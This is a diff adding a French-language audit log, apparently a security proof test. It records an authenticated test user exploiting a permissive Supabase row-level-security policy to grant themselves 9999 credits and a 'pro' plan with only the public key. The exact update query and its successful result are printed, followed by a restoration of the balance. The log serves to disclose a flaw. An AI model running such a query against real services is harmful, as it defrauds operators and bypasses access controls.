@@ -1,0 +1,15 @@
+
+==============================================================================
+01 — Escalade de crédits via la policy RLS « Users can update own profile »
+==============================================================================
+[2026-08-04 18:30:12Z] Connecté en tant que preuve-a@bibble-preuves.test (a7e35360-6c91-4b2c-b283-d193eef9c57f)
+[2026-08-04 18:30:12Z] Solde et plan avant l'attaque : 2 crédits, plan « starter »
+[2026-08-04 18:30:12Z] 
+[2026-08-04 18:30:12Z] Requête envoyée avec la clé anon et le jeton de l'utilisateur :
+[2026-08-04 18:30:12Z]   supabase.from("profiles").update({ credits: 9999, plan: "pro" })
+[2026-08-04 18:30:12Z]                            .eq("id", "a7e35360-6c91-4b2c-b283-d193eef9c57f")
+[2026-08-04 18:30:12Z] Réponse : 1 ligne(s) modifiée(s)
+[2026-08-04 18:30:12Z] Solde et plan après l'attaque : 9999 crédits, plan « pro »
+[2026-08-04 18:30:12Z] Remise en état : solde restauré à 2 crédits
+
+❌ EXPLOITÉ — un utilisateur authentifié s'est attribué 9999 crédits et le plan « pro » avec la seule clé publique du site
